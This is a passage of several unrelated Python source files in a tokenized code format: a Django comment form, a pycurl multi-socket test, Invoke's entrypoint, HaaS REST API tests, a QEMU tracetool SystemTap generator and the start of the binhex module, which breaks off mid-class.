dup, ▁ silently ▁ return ▁ the ▁ *previous* ▁ comment. <strnewline> ▁ """  <newline> possible_duplicates = self . get_comment_model ( ) . _default_manager . using ( self . target_object . _state . db ) . filter ( content_type = new . content_type , object_pk = new . object_pk , user_name = new . user_name , user_email = new . user_email , user_url = new . user_url , ) <newline> for old in possible_duplicates : <newline> <indent> if old . submit_date . date ( ) == new . submit_date . date ( ) and old . comment == new . comment : <newline> <indent> return old <newline> <dedent> <dedent> return new <newline> <dedent> def clean_comment ( self ) : <newline> <indent>  """ <strnewline> ▁ If ▁ COMMENTS_ALLOW_PROFANITIES ▁ is ▁ False, ▁ check ▁ that ▁ the ▁ comment ▁ doesn't <strnewline> ▁ contain ▁ anything ▁ in ▁ PROFANITIES_LIST. <strnewline> ▁ """  <newline> comment = self . cleaned_data [ "comment" ] <newline> if settings . COMMENTS_ALLOW_PROFANITIES == False : <newline> <indent> bad_words = [ w for w in settings . PROFANITIES_LIST if w in comment . lower ( ) ] <newline> if bad_words : <newline> <indent> plural = len ( bad_words ) > 1 <newline> raise forms . ValidationError ( ungettext ( "Watch ▁ your ▁ mouth! ▁ The ▁ word ▁ %s ▁ is ▁ not ▁ allowed ▁ here." , "Watch ▁ your ▁ mouth! ▁ The ▁ words ▁ %s ▁ are ▁ not ▁ allowed ▁ here." , plural ) % get_text_list ( [ '"%s%s%s"' % ( i [ 0 ] , '-' * ( len ( i ) - 2 ) , i [ - 1 ] ) for i in bad_words ] , 'and' ) ) <newline> <dedent> <dedent> return comment <newline> <dedent> <dedent> class CommentForm ( CommentDetailsForm ) : <newline> <indent> honeypot = forms . CharField ( required = False , label = _ ( 'If ▁ you ▁ enter ▁ anything ▁ in ▁ this ▁ field ▁ ' 'your ▁ comment ▁ will ▁ be ▁ treated ▁ as ▁ spam' ) ) <newline> def clean_honeypot ( self ) : <newline> <indent>  """ Check ▁ that ▁ nothing's ▁ been ▁ entered ▁ into ▁ the ▁ honeypot. """  <newline> value = self . cleaned_data [ "honeypot" ] <newline> if value : <newline> <indent> raise forms . ValidationError ( self . fields [ "honeypot" ] . label ) <newline> <dedent> return value <newline> <dedent> <dedent>
 # ! ▁ /usr/bin/env ▁ python <encdom>  # ▁ -*- ▁ coding: ▁ iso-8859-1 ▁ -*- <encdom>  # ▁ vi:ts=4:et <encdom>  # ▁ $Id: ▁ test_multi_socket.py,v ▁ 1.1 ▁ 2006/11/10 ▁ 15:03:05 ▁ kjetilja ▁ Exp ▁ $ <encdom> import os , sys <newline> try : <newline> <indent> from cStringIO import StringIO <newline> <dedent> except ImportError : <newline> <indent> from StringIO import StringIO <newline> <dedent> import pycurl <newline> urls = ( "http://curl.haxx.se" , "http://www.python.org" , "http://pycurl.sourceforge.net" , ) <newline>  # ▁ Read ▁ list ▁ of ▁ URIs ▁ from ▁ file ▁ specified ▁ on ▁ commandline <encdom> try : <newline> <indent> urls = open ( sys . argv [ 1 ] , "rb" ) . readlines ( ) <newline> <dedent> except IndexError : <newline>  # ▁ No ▁ file ▁ was ▁ specified <encdom> <indent> pass <newline>  # ▁ timer ▁ callback <encdom> <dedent> def timer ( msecs ) : <newline> <indent> print 'Timer ▁ callback ▁ msecs:' , msecs <newline>  # ▁ socket ▁ callback <encdom> <dedent> def socket ( event , socket , multi , data ) : <newline> <indent> print event , socket , multi , data <newline>  # ▁ multi.assign(socket, ▁ timer) <encdom>  # ▁ init <encdom> <dedent> m = pycurl . CurlMulti ( ) <newline> m . setopt ( pycurl . M_PIPELINING , 1 ) <newline> m . setopt ( pycurl . M_TIMERFUNCTION , timer ) <newline> m . setopt ( pycurl . M_SOCKETFUNCTION , socket ) <newline> m . handles = [ ] <newline> for url in urls : <newline> <indent> c = pycurl . Curl ( ) <newline>  # ▁ save ▁ info ▁ in ▁ standard ▁ Python ▁ attributes <encdom> c . url = url <newline> c . body = StringIO ( ) <newline> c . http_code = - 1 <newline> m . handles . append ( c ) <newline>  # ▁ pycurl ▁ API ▁ calls <encdom> c . setopt ( c . URL , c . url ) <newline> c . setopt ( c . WRITEFUNCTION , c . body . write ) <newline> m . add_handle ( c ) <newline>  # ▁ get ▁ data <encdom> <dedent> num_handles = len ( m . handles ) <newline> while num_handles : <newline> <indent> while 1 : <newline> <indent> ret , num_handles = m . socket_all ( ) <newline> if ret != pycurl . E_CALL_MULTI_PERFORM : <newline> <indent> break <newline>  # ▁ currently ▁ no ▁ more ▁ I/O ▁ is ▁ pending, ▁ could ▁ do ▁ something ▁ in ▁ the ▁ meantime <encdom>  # ▁ (display ▁ a ▁ progress ▁ bar, ▁ etc.) <encdom> <dedent> <dedent> m . select ( 1.0 ) <newline>  # ▁ close ▁ handles <encdom> <dedent> for c in m . handles : <newline>  # ▁ save ▁ info ▁ in ▁ standard ▁ Python ▁ attributes <encdom> <indent> c . http_code = c . getinfo ( c . HTTP_CODE ) <newline>  # ▁ pycurl ▁ API ▁ calls <encdom> m . remove_handle ( c ) <newline> c . close ( ) <newline> <dedent> m . close ( ) <newline>  # ▁ print ▁ result <encdom> for c in m . handles : <newline> <indent> data = c . body . getvalue ( ) <newline> if 0 : <newline> <indent> print "**********" , c . url , "**********" <newline> print data <newline> <dedent> else : <newline> <indent> print "%-53s ▁ http_code ▁ %3d, ▁ %6d ▁ bytes" % ( c . url , c . http_code , len ( data ) ) <newline> <dedent> <dedent>
 """ <strnewline> Invoke's ▁ own ▁'binary' ▁ entrypoint. <strnewline> <strnewline> Dogfoods ▁ the ▁ `program` ▁ module. <strnewline> """  <newline> from . import __version__ , Program <newline> program = Program ( name = "Invoke" , binary = 'inv[oke]' , version = __version__ , ) <newline>
 # ▁ Copyright ▁ 2014 ▁ Massachusetts ▁ Open ▁ Cloud ▁ Contributors ▁ (see ▁ AUTHORS). <encdom>  # ▁ Licensed ▁ under ▁ the ▁ Apache ▁ License, ▁ Version ▁ 2.0 ▁ (the ▁"License"); <encdom>  # ▁ you ▁ may ▁ not ▁ use ▁ this ▁ file ▁ except ▁ in ▁ compliance ▁ with ▁ the ▁ License. <encdom>  # ▁ You ▁ may ▁ obtain ▁ a ▁ copy ▁ of ▁ the ▁ License ▁ at <encdom>  # ▁ http://www.apache.org/licenses/LICENSE-2.0 <encdom>  # ▁ Unless ▁ required ▁ by ▁ applicable ▁ law ▁ or ▁ agreed ▁ to ▁ in ▁ writing, ▁ software <encdom>  # ▁ distributed ▁ under ▁ the ▁ License ▁ is ▁ distributed ▁ on ▁ an ▁"AS ▁ IS" ▁ BASIS, <encdom>  # ▁ WITHOUT ▁ WARRANTIES ▁ OR ▁ CONDITIONS ▁ OF ▁ ANY ▁ KIND, ▁ either ▁ express ▁ or ▁ implied. <encdom>  # ▁ See ▁ the ▁ License ▁ for ▁ the ▁ specific ▁ language ▁ governing ▁ permissions ▁ and <encdom>  # ▁ limitations ▁ under ▁ the ▁ License. <encdom> from haas import rest <newline> from abc import ABCMeta , abstractmethod <newline> from StringIO import StringIO <newline> import unittest <newline> import json <newline> import sys <newline> from werkzeug . routing import Map <newline> from werkzeug . wrappers import Request <newline> from schema import Schema , Optional <newline>  # ▁ We ▁ don't ▁ directly ▁ use ▁ this, ▁ but ▁ unless ▁ we ▁ import ▁ it, ▁ the ▁ coverage ▁ tool <encdom>  # ▁ complains ▁ and ▁ doesn't ▁ give ▁ us ▁ a ▁ report. <encdom> import pytest <newline> def wsgi_mkenv ( method , path , data = None ) : <newline> <indent>  """ Helper ▁ routine ▁ to ▁ build ▁ a ▁ wsgi ▁ environment. <strnewline> <strnewline> ▁ We ▁ need ▁ this ▁ to ▁ generate ▁ mock ▁ requests. <strnewline> ▁ """  <newline> env = { 'REQUEST_METHOD' : method , 'SCRIPT_NAME' : '' , 'PATH_INFO' : path , 'SERVER_NAME' : 'haas.test-env' , 'SERVER_PORT' : '5000' , 'wsgi.version' : ( 1 , 0 ) , 'wsgi.url_scheme' : 'http' , 'wsgi.errors' : sys . stderr , 'wsgi.multithreaded' : False , 'wsgi.multiprocess' : False , 'wsgi.run_once' : False , } <newline> if data is None : <newline> <indent> env [ 'wsgi.input' ] = StringIO ( ) <newline> <dedent> else : <newline> <indent> env [ 'wsgi.input' ] = StringIO ( data ) <newline> <dedent> return env <newline> <dedent> class HttpTest ( unittest . TestCase ) : <newline> <indent>  """ A ▁ test ▁ which ▁ excercises ▁ the ▁ http ▁ server. <strnewline> <strnewline> ▁ HttpTests ▁ run ▁ with ▁ no ▁ api ▁ functions ▁ registered ▁ to ▁ the ▁ http ▁ server ▁ yet; <strnewline> ▁ this ▁ lets ▁ us ▁ test ▁ the ▁ http-related ▁ code ▁ in ▁ an ▁ environment ▁ that ▁ is ▁ not <strnewline> ▁ constrained ▁ by ▁ our ▁ actual ▁ api. <strnewline> ▁ """  <newline> def setUp ( self ) : <newline>  # ▁ We ▁ back ▁ up ▁ the ▁ old ▁ _url_map, ▁ and ▁ restore ▁ it ▁ in ▁ tearDown; ▁ this ▁ makes <encdom>  # ▁ it ▁ easy ▁ to ▁ be ▁ sure ▁ that ▁ we're ▁ not ▁ interfering ▁ with ▁ other ▁ tests: <encdom> <indent> self . old_url_map = rest . _url_map <newline>  # ▁ We ▁ make ▁ ourselves ▁ an ▁ empty ▁ one ▁ for ▁ our ▁ test: <encdom> rest . _url_map = Map ( ) <newline> <dedent> def tearDown ( self ) : <newline> <indent> rest . _url_map = self . old_url_map <newline> <dedent> <dedent> class HttpEquivalenceTest ( object ) : <newline> <indent>  """ A ▁ test ▁ that ▁ ensures ▁ a ▁ particlar ▁ call ▁ to ▁ the ▁ api ▁ behaves ▁ the ▁ same ▁ over <strnewline> ▁ http ▁ and ▁ when ▁ called ▁ as ▁ a ▁ function. ▁ Subclasses ▁ must ▁ override ▁ `api_call` <strnewline> ▁ and ▁ `request`, ▁ and ▁ may ▁ also ▁ be ▁ interested ▁ in ▁ `api_setup` ▁ and <strnewline> ▁ `api_teardown`. <strnewline> ▁ """  <newline> __metaclass__ = ABCMeta <newline> @ abstractmethod <newline> def api_call ( self ) : <newline> <indent>  """ Invoke ▁ the ▁ api ▁ call ▁ directly. """  <newline> <dedent> @ abstractmethod <newline> def request ( self ) : <newline> <indent>  """ Return ▁ a ▁ request ▁ which ▁ will ▁ invoke ▁ the ▁ api ▁ call. <strnewline> <strnewline> ▁ The ▁ request ▁ should ▁ take ▁ the ▁ form ▁ of ▁ a ▁ WSGI ▁ v1.0 ▁ environment. <strnewline> ▁ The ▁ function ▁ `wsgi_mkenv` ▁ can ▁ be ▁ used ▁ to ▁ build ▁ a ▁ suitable <strnewline> ▁ environment. <strnewline> ▁ """  <newline> <dedent> def api_setup ( self ) : <newline> <indent>  """ Setup ▁ routine ▁ to ▁ be ▁ run ▁ before ▁ each ▁ call ▁ to ▁ the ▁ api. <strnewline> <strnewline> ▁ This ▁ is ▁ conceptually ▁ similar ▁ to ▁ python's ▁ unittest ▁ setUp() <strnewline> ▁ method, ▁ but ▁ with ▁ each ▁ call ▁ to ▁ `api_call`, ▁ rather ▁ than ▁ the <strnewline> ▁ whole ▁ test. <strnewline> <strnewline> ▁ By ▁ default ▁ this ▁ is ▁ a ▁ noop; ▁ subclasses ▁ should ▁ override ▁ this ▁ if <strnewline> ▁ they ▁ need ▁ specific ▁ environments. <strnewline> ▁ """  <newline> <dedent> def api_teardown ( self ) : <newline> <indent>  """ like ▁ `api_setup`, ▁ but ▁ tears ▁ things ▁ down ▁ after ▁ the ▁ call. """  <newline> <dedent> def test_equivalence ( self ) : <newline> <indent>  """ Calling ▁ `api_call` ▁ directly ▁ should ▁ be ▁ the ▁ same ▁ as ▁ via ▁ http. """  <newline>  # ▁ First ▁ invoke ▁ the ▁ call ▁ over ▁ http. ▁ This ▁ should ▁ never ▁ raise ▁ exceptions. <encdom> self . api_setup ( ) <newline> req = Request ( self . request ( ) ) <newline> resp = rest . request_handler ( req ) <newline> body = resp . get_data ( ) <newline> self . api_teardown ( ) <newline>  # ▁ Now ▁ call ▁ it ▁ directly. <encdom> try : <newline> <indent> self . api_setup ( ) <newline> ret = self . api_call ( ) <newline> assert resp . status_code == 200 <newline> if ret == '' : <newline> <indent> assert body == '' <newline> <dedent> else : <newline> <indent> assert json . loads ( body ) == json . loads ( ret ) <newline> <dedent> <dedent> except rest . APIError , e : <newline> <indent> assert resp . status_code == e . status_code <newline> assert json . loads ( body ) == { 'type' : e . __class__ . __name__ , 'msg' : e . message , } <newline> <dedent> finally : <newline> <indent> self . api_teardown ( ) <newline> <dedent> <dedent> <dedent> class TestUrlArgs ( HttpEquivalenceTest , HttpTest ) : <newline> <indent>  """ Test ▁ that ▁ arguments ▁ supplied ▁ in ▁ the ▁ url ▁ are ▁ passed ▁ correctly. """  <newline>  # ▁ The ▁ use ▁ of ▁ HTTPEquivalenceTest ▁ here ▁ is ▁ a ▁ bit ▁ weird; ▁ We're ▁ not ▁ actually <encdom>  # ▁ calling ▁ the ▁ api ▁ function ▁ from ▁ `api_call`. ▁ This ▁ is ▁ actually ▁ probably ▁ a <encdom>  # ▁ fairly ▁ common ▁ way ▁ to ▁ want ▁ to ▁ use ▁ the ▁ superclass; ▁ we ▁ should ▁ think ▁ about <encdom>  # ▁ whether ▁ the ▁ documented ▁ usage ▁ is ▁ necessarily ▁ the ▁ right ▁ idea. <encdom> def setUp ( self ) : <newline> <indent> HttpTest . setUp ( self ) <newline> @ rest . rest_call ( 'GET' , '/func/<foo>/<bar>' ) <newline> def func ( foo , bar ) : <newline> <indent> return json . dumps ( [ foo , bar ] ) <newline> <dedent> <dedent> def api_call ( self ) : <newline> <indent> return json . dumps ( [ 'alice' , 'bob' ] ) <newline> <dedent> def request ( self ) : <newline> <indent> return wsgi_mkenv ( 'GET' , '/func/alice/bob' ) <newline> <dedent> <dedent> class TestBodyArgs ( HttpEquivalenceTest , HttpTest ) : <newline> <indent>  """ Test ▁ that ▁ arguments ▁ supplied ▁ in ▁ the ▁ body ▁ are ▁ passed ▁ correctly. """  <newline> def setUp ( self ) : <newline> <indent> HttpTest . setUp ( self ) <newline> @ rest . rest_call ( 'POST' , '/func/foo' ) <newline> def foo ( bar , baz ) : <newline> <indent> return json . dumps ( [ bar , baz ] ) <newline> <dedent> <dedent> def api_call ( self ) : <newline> <indent> return json . dumps ( [ 'bonnie' , 'clyde' ] ) <newline> <dedent> def request ( self ) : <newline> <indent> return wsgi_mkenv ( 'POST' , '/func/foo' , data = json . dumps ( { 'bar' : 'bonnie' , 'baz' : 'clyde' } ) ) <newline> <dedent> <dedent> class TestRestCallSchema ( HttpEquivalenceTest , HttpTest ) : <newline> <indent>  """ Test ▁ that ▁ an ▁ alternate ▁ schema ▁ is ▁ used ▁ if ▁ one ▁ is ▁ provided ▁ to ▁ rest_call. """  <newline> def setUp ( self ) : <newline> <indent> HttpTest . setUp ( self ) <newline> @ rest . rest_call ( 'POST' , '/product' , schema = Schema ( { 'x' : int , 'y' : int , Optional ( 'z' ) : int , } ) ) <newline> def product ( x , y , z = 1 ) : <newline> <indent> return json . dumps ( x * y * z ) <newline> <dedent> <dedent> def api_call ( self ) : <newline> <indent> return json . dumps ( 14 ) <newline> <dedent> def request ( self ) : <newline> <indent> return wsgi_mkenv ( 'POST' , '/product' , data = json . dumps ( { 'x' : 2 , 'y' : 7 } ) ) <newline> <dedent> <dedent> class TestEquiv_basic_APIError ( HttpEquivalenceTest , HttpTest ) : <newline> <indent>  """ Basic ▁ test ▁ to ▁ make ▁ sure ▁ the ▁ APIError ▁ handling ▁ code ▁ is ▁ excercised. """  <newline> def setUp ( self ) : <newline> <indent> HttpTest . setUp ( self ) <newline> @ rest . rest_call ( 'GET' , '/some_error' ) <newline> def some_error ( ) : <newline> <indent> self . api_call ( ) <newline> <dedent> <dedent> def api_call ( self ) : <newline> <indent> raise rest . APIError ( "Basic ▁ test ▁ of ▁ the ▁ APIError ▁ code." ) <newline> <dedent> def request ( self ) : <newline> <indent> return wsgi_mkenv ( 'GET' , '/some_error' ) <newline> <dedent> <dedent> def _is_error ( resp , errtype ) : <newline> <indent>  """ Return ▁ True ▁ iff ▁ the ▁ Response ▁ `resp` ▁ represents ▁ an ▁ `errtype`. <strnewline> <strnewline> ▁ `resp` ▁ should ▁ be ▁ a ▁ response ▁ returned ▁ by ▁ `request_handler`. <strnewline> ▁ `errtype` ▁ should ▁ be ▁ a ▁ subclass ▁ of ▁ APIError. <strnewline> ▁ """  <newline> try : <newline> <indent> return json . loads ( resp . get_data ( ) ) [ 'type' ] == errtype . __name__ <newline> <dedent> except : <newline>  # ▁ It's ▁ possible ▁ that ▁ this ▁ response ▁ isn't ▁ even ▁ an ▁ error, ▁ in ▁ which ▁ case <encdom>  # ▁ the ▁ data ▁ may ▁ not ▁ parse ▁ as ▁ the ▁ above ▁ statement ▁ is ▁ expecting. ▁ Well, <encdom>  # ▁ it's ▁ not ▁ an ▁ error, ▁ so: <encdom> <indent> return False <newline> <dedent> <dedent> class TestValidationError ( HttpTest ) : <newline> <indent>  """ basic ▁ tests ▁ for ▁ input ▁ validation. """  <newline> def setUp ( self ) : <newline> <indent> HttpTest . setUp ( self ) <newline> @ rest . rest_call ( 'POST' , '/give-me-an-e' ) <newline> def api_call ( foo , bar ) : <newline> <indent> pass <newline> <dedent> @ rest . rest_call ( 'PUT' , '/custom-schema' , schema = Schema ( { "the_value" : int , } ) ) <newline> def custom_schema ( the_value ) : <newline> <indent> return repr ( the_value ) <newline> <dedent> <dedent> def _do_request ( self , data ) : <newline> <indent>  """ Make ▁ a ▁ request ▁ to ▁ the ▁ endpoint ▁ with ▁ `data` ▁ in ▁ the ▁ body. <strnewline> <strnewline> ▁ `data` ▁ should ▁ be ▁ a ▁ string ▁ -- ▁ the ▁ server ▁ will ▁ expect ▁ valid ▁ json, ▁ but <strnewline> ▁ we ▁ want ▁ to ▁ write ▁ test ▁ cases ▁ with ▁ invalid ▁ input ▁ as ▁ well. <strnewline> ▁ """  <newline> req = Request ( wsgi_mkenv ( 'POST' , '/give-me-an-e' , data = data ) ) <newline> return rest . request_handler ( req ) <newline> <dedent> def test_ok ( self ) : <newline> <indent> assert not _is_error ( self . _do_request ( json . dumps ( { 'foo' : 'alice' , 'bar' : 'bob' } ) ) , rest . ValidationError ) <newline> <dedent> def test_bad_json ( self ) : <newline> <indent> assert _is_error ( self . _do_request ( 'xploit' ) , rest . ValidationError ) <newline> <dedent> def test_missing_bar ( self ) : <newline> <indent> assert _is_error ( self . _do_request ( json . dumps ( { 'foo' : 'hello' } ) ) , rest . ValidationError ) <newline> <dedent> def test_extra_baz ( self ) : <newline> <indent> assert _is_error ( self . _do_request ( json . dumps ( { 'foo' : 'alice' , 'bar' : 'bob' , 'baz' : 'eve' } ) ) , rest . ValidationError ) <newline> <dedent> def test_custom_schema ( self ) : <newline> <indent> assert _is_error ( self . _do_request ( json . dumps ( { 'the_value' : 'Not ▁ an ▁ integer!' , } ) ) , rest . ValidationError ) <newline> <dedent> <dedent>
 # !/usr/bin/env ▁ python <encdom>  # ▁ -*- ▁ coding: ▁ utf-8 ▁ -*- <encdom>  """ <strnewline> Generate ▁ .stp ▁ file ▁ that ▁ outputs ▁ simpletrace ▁ binary ▁ traces ▁ (DTrace ▁ with ▁ SystemTAP ▁ only). <strnewline> """  <newline> __author__ = "Stefan ▁ Hajnoczi ▁ <redhat.com>" <newline> __copyright__ = "Copyright ▁ (C) ▁ 2014, ▁ Red ▁ Hat, ▁ Inc." <newline> __license__ = "GPL ▁ version ▁ 2 ▁ or ▁ (at ▁ your ▁ option) ▁ any ▁ later ▁ version" <newline> __maintainer__ = "Stefan ▁ Hajnoczi" <newline> __email__ = "stefanha@redhat.com" <newline> from tracetool import out <newline> from tracetool . backend . dtrace import binary , probeprefix <newline> from tracetool . backend . simple import is_string <newline> from tracetool . format . stap import stap_escape <newline> def generate ( events , backend ) : <newline> <indent> out ( '/* ▁ This ▁ file ▁ is ▁ autogenerated ▁ by ▁ tracetool, ▁ do ▁ not ▁ edit. ▁ */' , '' ) <newline> for event_id , e in enumerate ( events ) : <newline> <indent> if 'disable' in e . properties : <newline> <indent> continue <newline> <dedent> out ( 'probe ▁ %(probeprefix)s.simpletrace.%(name)s ▁ = ▁ %(probeprefix)s.%(name)s ▁ ?' , '{' , probeprefix = probeprefix ( ) , name = e . name ) <newline>  # ▁ Calculate ▁ record ▁ size <encdom> sizes = [ '24' ]  # ▁ sizeof(TraceRecord) <encdom> <newline> for type_ , name in e . args : <newline> <indent> name = stap_escape ( name ) <newline> if is_string ( type_ ) : <newline> <indent> out ( ' ▁ ▁ ▁ ▁ try ▁ {' , ' ▁ ▁ ▁ ▁ ▁ ▁ ▁ ▁ arg%(name)s_str ▁ = ▁ %(name)s ▁ ? ▁ user_string_n(%(name)s, ▁ 512) ▁ : ▁"<null>"' , ' ▁ ▁ ▁ ▁ } ▁ catch ▁ {}' , ' ▁ ▁ ▁ ▁ arg%(name)s_len ▁ = ▁ strlen(arg%(name)s_str)' , name = name ) <newline> sizes . append ( '4 ▁ + ▁ arg%s_len' % name ) <newline> <dedent> else : <newline> <indent> sizes . append ( '8' ) <newline> <dedent> <dedent> sizestr = ' ▁ + ▁ ' . join ( sizes ) <newline>  # ▁ Generate ▁ format ▁ string ▁ and ▁ value ▁ pairs ▁ for ▁ record ▁ header ▁ and ▁ arguments <encdom> fields = [ ( '8b' , str ( event_id ) ) , ( '8b' , 'gettimeofday_ns()' ) , ( '4b' , sizestr ) , ( '4b' , 'pid()' ) ] <newline> for type_ , name in e . args : <newline> <indent> name = stap_escape ( name ) <newline> if is_string ( type_ ) : <newline> <indent> fields . extend ( [ ( '4b' , 'arg%s_len' % name ) , ( '.*s' , 'arg%s_len, ▁ arg%s_str' % ( name , name ) ) ] ) <newline> <dedent> else : <newline> <indent> fields . append ( ( '8b' , name ) ) <newline>  # ▁ Emit ▁ the ▁ entire ▁ record ▁ in ▁ a ▁ single ▁ SystemTap ▁ printf() <encdom> <dedent> <dedent> fmt_str = '%' . join ( fmt for fmt , _ in fields ) <newline> arg_str = ', ▁ ' . join ( arg for _ , arg in fields ) <newline> out ( ' ▁ ▁ ▁ ▁ printf("%%%(fmt_str)s", ▁ %(arg_str)s)' , fmt_str = fmt_str , arg_str = arg_str ) <newline> out ( '}' ) <newline> <dedent> out ( ) <newline> <dedent>
 """ Macintosh ▁ binhex ▁ compression/decompression. <strnewline> <strnewline> easy ▁ interface: <strnewline> binhex(inputfilename, ▁ outputfilename) <strnewline> hexbin(inputfilename, ▁ outputfilename) <strnewline> """  <newline>  # ▁ Jack ▁ Jansen, ▁ CWI, ▁ August ▁ 1995. <encdom>  # ▁ The ▁ module ▁ is ▁ supposed ▁ to ▁ be ▁ as ▁ compatible ▁ as ▁ possible. ▁ Especially ▁ the <encdom>  # ▁ easy ▁ interface ▁ should ▁ work ▁"as ▁ expected" ▁ on ▁ any ▁ platform. <encdom>  # ▁ XXXX ▁ Note: ▁ currently, ▁ textfiles ▁ appear ▁ in ▁ mac-form ▁ on ▁ all ▁ platforms. <encdom>  # ▁ We ▁ seem ▁ to ▁ lack ▁ a ▁ simple ▁ character-translate ▁ in ▁ python. <encdom>  # ▁ (we ▁ should ▁ probably ▁ use ▁ ISO-Latin-1 ▁ on ▁ all ▁ but ▁ the ▁ mac ▁ platform). <encdom>  # ▁ XXXX ▁ The ▁ simple ▁ routines ▁ are ▁ too ▁ simple: ▁ they ▁ expect ▁ to ▁ hold ▁ the ▁ complete <encdom>  # ▁ files ▁ in-core. ▁ Should ▁ be ▁ fixed. <encdom>  # ▁ XXXX ▁ It ▁ would ▁ be ▁ nice ▁ to ▁ handle ▁ AppleDouble ▁ format ▁ on ▁ unix <encdom>  # ▁ (for ▁ servers ▁ serving ▁ macs). <encdom>  # ▁ XXXX ▁ I ▁ don't ▁ understand ▁ what ▁ happens ▁ when ▁ you ▁ get ▁ 0x90 ▁ times ▁ the ▁ same ▁ byte ▁ on <encdom>  # ▁ input. ▁ The ▁ resulting ▁ code ▁ (xx ▁ 90 ▁ 90) ▁ would ▁ appear ▁ to ▁ be ▁ interpreted ▁ as ▁ an <encdom>  # ▁ escaped ▁ *value* ▁ of ▁ 0x90. ▁ All ▁ coders ▁ I've ▁ seen ▁ appear ▁ to ▁ ignore ▁ this ▁ nicety... <encdom> import sys <newline> import os <newline> import struct <newline> import binascii <newline> __all__ = [ "binhex" , "hexbin" , "Error" ] <newline> class Error ( Exception ) : <newline> <indent> pass <newline>  # ▁ States ▁ (what ▁ have ▁ we ▁ written) <encdom> <dedent> [ _DID_HEADER , _DID_DATA , _DID_RSRC ] = range ( 3 ) <newline>  # ▁ Various ▁ constants <encdom> REASONABLY_LARGE = 32768  # ▁ Minimal ▁ amount ▁ we ▁ pass ▁ the ▁ rle-coder <encdom> <newline> LINELEN = 64 <newline> RUNCHAR = chr ( 0x90 )  # ▁ run-length ▁ introducer <encdom> <newline>  # ▁ This ▁ code ▁ is ▁ no ▁ longer ▁ byte-order ▁ dependent <encdom>  # ▁ Workarounds ▁ for ▁ non-mac ▁ machines. <encdom> try : <newline> <indent> from Carbon . File import FSSpec , FInfo <newline> from MacOS import openrf <newline> def getfileinfo ( name ) : <newline> <indent> finfo = FSSpec ( name ) . FSpGetFInfo ( ) <newline> dir , file = os . path . split ( name ) <newline>  # ▁ XXX ▁ Get ▁ resource/data ▁ sizes <encdom> fp = open ( name , 'rb' ) <newline> fp . seek ( 0 , 2 ) <newline> dlen = fp . tell ( ) <newline> fp = openrf ( name , '*rb' ) <newline> fp . seek ( 0 , 2 ) <newline> rlen = fp . tell ( ) <newline> return file , finfo , dlen , rlen <newline> <dedent> def openrsrc ( name , * mode ) : <newline> <indent> if not mode : <newline> <indent> mode = '*rb' <newline> <dedent> else : <newline> <indent> mode = '*' + mode [ 0 ] <newline> <dedent> return openrf ( name , mode ) <newline> <dedent> <dedent> except ImportError : <newline>  # ▁ Glue ▁ code ▁ for ▁ non-macintosh ▁ usage <encdom> <indent> class FInfo : <newline> <indent> def __init__ ( self ) : <newline> <indent> self . Type = '????' <newline> self . Creator = '????' <newline> self . Flags = 0 <newline> <dedent> <dedent> def getfileinfo ( name ) : <newline> <indent> finfo = FInfo ( ) <newline>  # ▁ Quick ▁ check ▁ for ▁ textfile <encdom> fp = open ( name ) <newline> data = open ( name ) . read ( 256 ) <newline> for c in data : <newline> <indent> if not c . isspace ( ) and ( c < ' ▁ ' or ord ( c ) > 0x7f ) : <newline> <indent> break <newline> <dedent> <dedent> else : <newline> <indent> finfo . Type = 'TEXT' <newline> <dedent> fp . seek ( 0 , 2 ) <newline> dsize = fp . tell ( ) <newline> fp . close ( ) <newline> dir , file = os . path . split ( name ) <newline> file = file . replace ( ':' , '-' , 1 ) <newline> return file , finfo , dsize , 0 <newline> <dedent> class openrsrc : <newline> <indent> def __init__ ( self , * args ) : <newline> <indent> pass <newline> <dedent> def read ( self , * args ) : <newline> <indent> return '' <newline> <dedent> def write ( self , * args ) : <newline> <indent> pass <newline> <dedent> def close ( self ) : <newline> <indent> pass <newline> <dedent> <dedent> <dedent> class _Hqxcoderengine : <newline> <indent>  """ Write ▁ data ▁ to ▁ the ▁ coder ▁ in ▁ 3-byte ▁ chunks """  <newline> def __init__ ( self , ofp ) : <newline> <indent> self . ofp = ofp <newline> self . data = '' <newline> self . hqxdata = '' <newline> self . linelen = LINELEN - 1 <newline> <dedent> def write ( self , data ) : <newline> <indent> self . data = self . data + data <newline> datalen = len ( self . data ) <newline> todo = ( datalen // 3 ) * 3 <newline> data = self . data [ : todo ] <newline> self . data = self . data [ todo : ] <newline> if not data : <newline> <indent> return <newline> <dedent> self . hqxdata = self . hqxdata + binascii . b2a_hqx ( data ) <newline> self . _flush ( 0 ) <newline> <dedent> def _flush ( self , force ) : <newline> <indent> first = 0 <newline> while first <= len ( self . hqxdata ) - self . linelen : <newline> <indent> last = first + self . linelen <newline> self . ofp . write ( self . hqxdata [ first : last ] + ' \n ' ) <newline> self . linelen = LINELEN <newline> first = last <newline> <dedent> self . hqxdata = self . hqxdata [ first : ] <newline> if force : <newline> <indent> self . ofp . write ( self . hqxdata + ': \n ' ) <newline> <dedent> <dedent> def close ( self ) : <newline> <indent> if self . data : <newline> <indent> self . hqxdata = self . hqxdata + binascii . b2a_hqx ( self . data ) <newline> <dedent> self . _flush ( 1 ) <newline> self . ofp . close ( ) <newline> del self . ofp <newline> <dedent> <dedent> class _Rlecoderengine : <newline> <indent>  """ Write ▁ data ▁ to ▁ the ▁ RLE-coder ▁ in ▁ suitably ▁ large ▁ chunks """  <newline> def __init__ ( self , ofp ) : <newline> <indent> self . ofp = ofp <newline> self . data = '' <newline> <dedent> def write ( self , data ) : <newline> <indent> self . data = self . data + data <newline> if len ( self . data ) < REASONABLY_LARGE : <newline> <indent> return <newline> <dedent> rledata = binascii . rlecode_hqx ( self . data ) <newline> self . ofp . write ( rledata ) <newline> self . data = '' <newline> <dedent> def close ( self ) : <newline> <indent> if self . data : <newline> <indent> rledata = binascii . rlecode_hqx ( self . data ) <newline> self . ofp . write ( rledata ) <newline> <dedent> self . ofp . close ( ) <newline> del self . ofp <newline> <dedent> <dedent> class BinHex : <newline> <indent> def __init__ ( self , name_finfo_dlen_rlen , ofp ) : <newline> <indent> name , finfo , dlen , rlen = name_finfo_dlen_rlen <newline> if type ( ofp ) == type ( '' ) : <newline> <indent> ofname = ofp <newline> ofp = open ( ofname , 'w' ) <newline> <dedent> ofp . write ( '(This ▁ file ▁ must ▁ be ▁ converted ▁ with ▁ BinHex ▁ 4.0) \n \n :' ) <newline> hqxer = _Hqxcoderengine ( ofp ) <newline> self . ofp = _Rlecoderengine ( hqxer ) <newline> self . crc = 0 <newline> if finfo is None : <newline> <indent> finfo = FInfo ( ) <newline> <dedent> self . dlen = dlen 